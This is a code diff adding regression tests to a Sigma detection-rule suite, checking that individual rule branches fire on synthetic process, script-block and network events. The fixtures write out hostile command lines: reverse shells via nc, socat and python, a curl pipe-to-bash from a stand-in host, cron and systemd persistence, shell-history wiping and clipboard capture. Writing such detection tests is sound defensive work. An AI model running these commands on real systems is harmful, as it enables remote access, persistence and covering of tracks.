@@ -235,6 +235,130 @@ class SigmaDetectionTests(unittest.TestCase):
                          "PowerShell data-compression-staging rule regressed: "
                          "Compress-Archive + temp destination branch no longer fires")
 
+    def test_clipboard_capture_winapi_branch_fires_independently(self):
+        # #441 Part B: fixtures.json's true_positive only exercises
+        # selection_cmdlet (Get-Clipboard) — the higher-confidence
+        # selection_winapi branch (Add-Type against user32/
+        # GetClipboardData, the P/Invoke pattern a script avoiding the
+        # cmdlet's own audit signature would use) never fires in any
+        # fixture. A typo dropping either winapi token would pass CI
+        # silently without this.
+        det = load_rule(SIGMA_DIR / "posh_ps_clipboard_capture.yml")["detection"]
+        winapi = {"EventID": 4104,
+                  "ScriptBlockText": "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern IntPtr GetClipboardData(uint uFormat);' -Name Win32Clip"}
+        self.assertTrue(detection_matches(det, winapi),
+                         "clipboard-capture rule regressed: user32/GetClipboardData "
+                         "branch no longer fires")
+
+    def test_archive_staging_non_rar_makecab_tar_branch_fires_independently(self):
+        # #441 Part B: fixtures.json's true_positive only exercises the 7z
+        # password branch — the makecab/tar branch (staging-path-scoped,
+        # since neither utility has a password/encryption flag at all —
+        # see this rule's own description) never fires in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_win_archive_staging_non_rar.yml")["detection"]
+        makecab_staged = {"Image": "C:\\Windows\\System32\\makecab.exe",
+                          "CommandLine": "makecab.exe C:\\data\\file.txt C:\\Users\\Public\\staged\\file.cab"}
+        self.assertTrue(detection_matches(det, makecab_staged),
+                         "archive-staging-non-rar rule regressed: makecab + staging "
+                         "destination branch no longer fires")
+        tar_staged = {"Image": "C:\\Windows\\System32\\tar.exe",
+                     "CommandLine": "tar.exe -cf C:\\ProgramData\\out.tar C:\\data"}
+        self.assertTrue(detection_matches(det, tar_staged),
+                         "archive-staging-non-rar rule regressed: tar + staging "
+                         "destination branch no longer fires")
+
+    def test_cloud_storage_exfil_subdomain_branch_fires_independently(self):
+        # #441 Part B: fixtures.json's true_positive only exercises
+        # selection_bare (an exact provider domain) — the dot-anchored
+        # selection_subdomain branch (a real subdomain of a listed
+        # provider, e.g. a per-user Mega/Dropbox subdomain) never fires
+        # in any fixture, and neither does the anti-lookalike anchoring
+        # this branch relies on (a bare-suffix-only match would also
+        # wrongly accept an unrelated lookalike domain).
+        det = load_rule(SIGMA_DIR / "net_zeek_ssl_cloud_storage_exfil.yml")["detection"]
+        real_subdomain = {"server_name": "eu.transfer.sh"}
+        self.assertTrue(detection_matches(det, real_subdomain),
+                         "cloud-storage-exfil rule regressed: real provider subdomain "
+                         "no longer fires")
+        lookalike_subdomain = {"server_name": "eu.faketransfer.sh"}
+        self.assertFalse(detection_matches(det, lookalike_subdomain),
+                          "cloud-storage-exfil rule over-fired: a subdomain of a "
+                          "LOOKALIKE domain (faketransfer.sh, not transfer.sh) "
+                          "should not match")
+
+    def test_reverse_shell_interpreter_nc_python_socat_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_bash_dev_tcp — the other three OR-branches (nc -e,
+        # python pty.spawn, socat EXEC:) never fire in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_reverse_shell_interpreter.yml")["detection"]
+        nc_exec = {"Image": "/usr/bin/nc", "CommandLine": "nc -e /bin/sh 10.0.0.5 4444"}
+        self.assertTrue(detection_matches(det, nc_exec),
+                         "reverse-shell rule regressed: nc -e branch no longer fires")
+        python_pty = {"Image": "/usr/bin/python3", "CommandLine": "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"}
+        self.assertTrue(detection_matches(det, python_pty),
+                         "reverse-shell rule regressed: python pty.spawn branch no longer fires")
+        socat_exec = {"Image": "/usr/bin/socat", "CommandLine": "socat TCP:10.0.0.5:4444 EXEC:/bin/sh"}
+        self.assertTrue(detection_matches(det, socat_exec),
+                         "reverse-shell rule regressed: socat EXEC: branch no longer fires")
+        # nc without -e, and socat without EXEC:, must NOT fire (companion
+        # flag/token required, not the bare binary alone).
+        nc_no_exec = {"Image": "/usr/bin/nc", "CommandLine": "nc -l -p 4444"}
+        self.assertFalse(detection_matches(det, nc_no_exec),
+                          "reverse-shell rule over-fired: nc without -e should not match")
+
+    def test_ingress_tool_transfer_pipe_to_shell_branch_fires_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_temp_dest — the pipe-to-shell branch never fires in
+        # any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_ingress_tool_transfer.yml")["detection"]
+        pipe_to_bash = {"Image": "/usr/bin/curl", "CommandLine": "curl http://evil.example/x.sh | bash"}
+        self.assertTrue(detection_matches(det, pipe_to_bash),
+                         "ingress-tool-transfer rule regressed: pipe-to-shell branch no longer fires")
+
+    def test_cron_at_persistence_cron_dir_and_at_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises the
+        # crontab branch — the cron-directory-write and `at` branches
+        # never fire in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_cron_at_persistence.yml")["detection"]
+        cron_dir_write = {"Image": "/bin/bash", "CommandLine": "echo '* * * * * curl evil|sh' > /etc/cron.d/evil"}
+        self.assertTrue(detection_matches(det, cron_dir_write),
+                         "cron/at-persistence rule regressed: cron-directory write branch no longer fires")
+        at_job = {"Image": "/usr/bin/at", "CommandLine": "at now + 1 minute"}
+        self.assertTrue(detection_matches(det, at_job),
+                         "cron/at-persistence rule regressed: at branch no longer fires")
+        # A read-only listing of the cron directory (no write verb) must
+        # NOT fire the cron-directory branch.
+        cron_dir_read = {"Image": "/bin/ls", "CommandLine": "ls /etc/cron.d/"}
+        self.assertFalse(detection_matches(det, cron_dir_read),
+                          "cron/at-persistence rule over-fired: a read-only cron.d listing "
+                          "with no write verb should not match")
+
+    def test_shell_history_tamper_unset_symlink_truncate_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_history_c — the other three OR-branches (unset
+        # HISTFILE, symlink to /dev/null, truncate) never fire in any
+        # fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_shell_history_tamper.yml")["detection"]
+        unset_histfile = {"Image": "/bin/bash", "CommandLine": "unset HISTFILE"}
+        self.assertTrue(detection_matches(det, unset_histfile),
+                         "shell-history-tamper rule regressed: unset HISTFILE branch no longer fires")
+        symlink_devnull = {"Image": "/bin/ln", "CommandLine": "ln -sf /dev/null ~/.bash_history"}
+        self.assertTrue(detection_matches(det, symlink_devnull),
+                         "shell-history-tamper rule regressed: symlink-to-/dev/null branch no longer fires")
+        truncate = {"Image": "/bin/bash", "CommandLine": "cat /dev/null > ~/.bash_history"}
+        self.assertTrue(detection_matches(det, truncate),
+                         "shell-history-tamper rule regressed: truncate branch no longer fires")
+
+    def test_systemd_service_persistence_unit_write_branch_fires_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises the
+        # systemctl-enable branch — the unit-file-write branch never
+        # fires in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_systemd_service_persistence.yml")["detection"]
+        unit_write = {"Image": "/bin/bash",
+                      "CommandLine": "bash -c 'cat > /etc/systemd/system/evil.service <<EOF\\n[Service]\\nEOF'"}
+        self.assertTrue(detection_matches(det, unit_write),
+                         "systemd-service-persistence rule regressed: unit-file-write branch no longer fires")
+
     def test_lazagne_survives_rename_off_lazagne_path(self):
         # M13 US2 (#232) security review: the fixtures.json true_positive for
         # this rule has "lazagne" in its own filename, so it alone cannot prove
